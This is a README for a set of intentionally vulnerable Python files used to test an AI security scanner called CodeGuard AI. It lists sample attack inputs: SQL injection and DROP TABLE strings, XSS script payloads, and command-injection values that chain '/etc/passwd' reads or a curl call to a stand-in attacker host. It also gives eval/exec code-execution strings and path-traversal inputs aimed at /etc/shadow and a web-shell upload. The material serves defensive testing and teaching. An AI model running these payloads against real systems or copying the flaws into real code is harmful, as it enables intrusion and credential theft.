# Sample Vulnerable Code for Testing CodeGuard AI

This directory contains **intentionally vulnerable code** designed to test the functionality of CodeGuard AI's security scanning, exploit testing, and reporting capabilities.

## ⚠️ WARNING

**DO NOT use this code in production environments!** These files contain real security vulnerabilities that can be exploited. They are for testing and educational purposes only.

## 📁 Files Overview

### 1. `sql_injection.py` - SQL Injection Vulnerabilities

Contains 4 vulnerable patterns and 1 secure example:

| Vulnerability Type | Line | Description |
|-------------------|------|-------------|
| String Concatenation | ~16 | Direct concatenation with `+` operator |
| f-string Injection | ~31 | Using f-strings to build SQL queries |
| .format() Injection | ~44 | Using `.format()` for SQL construction |
| % Formatting | ~57 | Using `%` operator for SQL queries |

**Test Exploits:**
```bash
# String concatenation bypass
username=' OR '1'='1' --
password=anything

# f-string injection
search_term='; DROP TABLE products; --

# .format() injection
user_id=1 OR 1=1
```

### 2. `xss_vulnerabilities.py` - Cross-Site Scripting

Contains 6 vulnerable patterns and 1 secure example:

| Vulnerability Type | Line | Description |
|-------------------|------|-------------|
| Reflected XSS | ~14 | Direct HTML output of user input |
| Template XSS | ~22 | f-string HTML template injection |
| Stored XSS | ~40, 48 | Unsanitized comment storage and display |
| DOM-based XSS | ~57 | JavaScript variable injection |
| innerHTML XSS | ~73 | Direct innerHTML assignment |
| URL Redirect XSS | ~87 | javascript: protocol injection |

**Test Exploits:**
```bash
# Reflected XSS
name=<script>alert('XSS')</script>

# DOM-based XSS
id=1'; alert('XSS'); //

# URL redirect XSS
url=javascript:alert('XSS')

# Comment injection
comment=<img src=x onerror=alert('XSS')>
```

### 3. `command_injection.py` - OS Command Injection

Contains 8 vulnerable patterns and 2 secure examples:

| Vulnerability Type | Line | Description |
|-------------------|------|-------------|
| os.system() | ~15 | Direct user input to os.system() |
| subprocess.call() | ~26 | shell=True with user input |
| subprocess.run() | ~36 | f-string with shell=True |
| os.popen() | ~49 | Direct command execution |
| eval() | ~60 | Arbitrary code via eval() |
| exec() | ~71 | Arbitrary code via exec() |
| .format() command | ~81 | String formatting in commands |
| subprocess.Popen() | ~90 | Multiple inputs with shell=True |

**Test Exploits:**
```bash
# Command chaining
host=localhost; cat /etc/passwd

# Pipe injection
domain=example.com | whoami

# Background execution
host=localhost & curl http://attacker.com

# eval() exploitation
expr=__import__('os').system('whoami')

# exec() exploitation
code=import os; os.system('ls -la')
```

### 4. `path_traversal.py` - Path Traversal / Directory Traversal

Contains 9 vulnerable patterns and 2 secure examples:

| Vulnerability Type | Line | Description |
|-------------------|------|-------------|
| Direct concatenation | ~14 | Path concatenation with user input |
| open() traversal | ~26 | f-string path construction |
| os.path.join() | ~38 | Improper use of os.path.join |
| Upload traversal | ~48 | Trusting user-provided filenames |
| Template access | ~62 | Template file path injection |
| Log file access | ~76 | Log directory traversal |
| Config file access | ~88 | Configuration file access |
| Zip slip | ~97 | Archive extraction vulnerability |
| Include files | ~112 | File inclusion vulnerability |

**Test Exploits:**
```bash
# Basic traversal
file=../../../etc/passwd

# Absolute path
file=/etc/shadow

# Encoded traversal
file=..%2F..%2F..%2Fetc%2Fpasswd

# Windows paths
file=..\..\..\windows\system32\config\sam

# Null byte injection (older systems)
file=../../../etc/passwd%00.txt

# Upload filename manipulation
filename=../../../var/www/html/shell.php
```

## 🧪 Testing with CodeGuard AI

### Option 1: Direct File Testing (Local)

1. Copy these files to a test GitHub repository
2. Create a pull request with these files
3. Run CodeGuard AI against the PR:

```bash
# Via CLI
python orchestrator.py <your-username> <test-repo> <pr-number> <github-token>

# Via Dashboard
streamlit run dashboard.py
# Then use the web interface to analyze the PR
```

### Option 2: Test Specific Vulnerabilities

Create a PR that adds just one file at a time to test specific vulnerability detection:

```bash
# Test SQL injection detection
git checkout -b test-sql-injection
cp sample_vulnerable_code/sql_injection.py ./api/database.py
git add api/database.py
git commit -m "Add database query endpoint"
git push origin test-sql-injection
# Create PR and run CodeGuard AI
```

### Option 3: Mixed Vulnerability Testing

Create a realistic scenario with multiple files:

```bash
git checkout -b feature-user-api
cp sample_vulnerable_code/sql_injection.py ./api/users.py
cp sample_vulnerable_code/xss_vulnerabilities.py ./api/search.py
cp sample_vulnerable_code/path_traversal.py ./api/files.py
git add .
git commit -m "Implement user API endpoints"
git push origin feature-user-api
# Create PR and run CodeGuard AI
```

## 📊 Expected CodeGuard AI Results

For each file, CodeGuard AI should:

1. **Detect Vulnerabilities** - Identify all vulnerable patterns using regex scanning
2. **Generate Exploits** - Create proof-of-concept exploits for each vulnerability
3. **Execute Safely** - Run exploits inside E2B sandbox to prove they work
4. **Generate Reports** - Create detailed markdown reports with:
   - Vulnerability type and severity
   - Line numbers and code snippets
   - Exploitation proof
   - Remediation recommendations
5. **Post to GitHub** - Comment on the PR with the security report

### Sample Expected Findings

For `sql_injection.py`:
- 4 SQL injection vulnerabilities detected
- High severity rating
- Exploits demonstrating authentication bypass
- Recommendation to use parameterized queries

For `xss_vulnerabilities.py`:
- 6 XSS vulnerabilities detected
- Medium to High severity
- Exploits showing script execution
- Recommendation to use HTML escaping

For `command_injection.py`:
- 8 command injection vulnerabilities
- Critical severity rating
- Exploits demonstrating RCE
- Recommendation to avoid shell=True and use input validation

For `path_traversal.py`:
- 9 path traversal vulnerabilities
- High severity rating
- Exploits accessing sensitive files
- Recommendation to use path validation and whitelisting

## 🛠️ Extending the Test Suite

### Adding New Vulnerabilities

1. Create a new Python file in this directory
2. Add vulnerable code patterns
3. Include comments marking vulnerabilities
4. Add secure examples for comparison
5. Update this README with test cases

### Adding Different Languages

Create examples in other languages:
```
sample_vulnerable_code/
├── javascript/
│   ├── sql_injection.js
│   ├── xss.js
│   └── prototype_pollution.js
├── java/
│   ├── SQLInjection.java
│   └── XXE.java
└── go/
    ├── sql_injection.go
    └── command_injection.go
```

## 📚 Learning Resources

Each file includes:
- **Vulnerable examples** - Real-world anti-patterns
- **Secure examples** - Best practices for comparison
- **Comments** - Explaining why code is vulnerable
- **Multiple patterns** - Different ways the same vulnerability appears

Use these files to:
1. Test CodeGuard AI's detection capabilities
2. Learn about common security vulnerabilities
3. Understand the difference between vulnerable and secure code
4. Practice security code review skills

## 🔒 Security Reminder

These files should:
- ✅ Be used in isolated test environments only
- ✅ Be tested inside E2B sandboxes
- ✅ Never be deployed to production
- ✅ Be used for education and testing only

**Remember:** CodeGuard AI runs exploit testing inside isolated E2B sandboxes for safety. Never test exploits against production systems or systems you don't own.

## 🎯 Success Criteria

CodeGuard AI should successfully:
- [x] Detect all 27+ vulnerabilities across the 4 files
- [x] Generate working exploits for each vulnerability type
- [x] Execute exploits safely inside E2B sandbox
- [x] Generate comprehensive security reports
- [x] Post findings to GitHub PRs with proper formatting
- [x] Differentiate between vulnerable and secure code patterns
- [x] Provide actionable remediation advice

## 📧 Questions or Issues?

If CodeGuard AI doesn't detect certain vulnerabilities or produces false positives, this helps improve the detection patterns in `sandbox_agent/agent.py`.

Happy testing! 🛡️
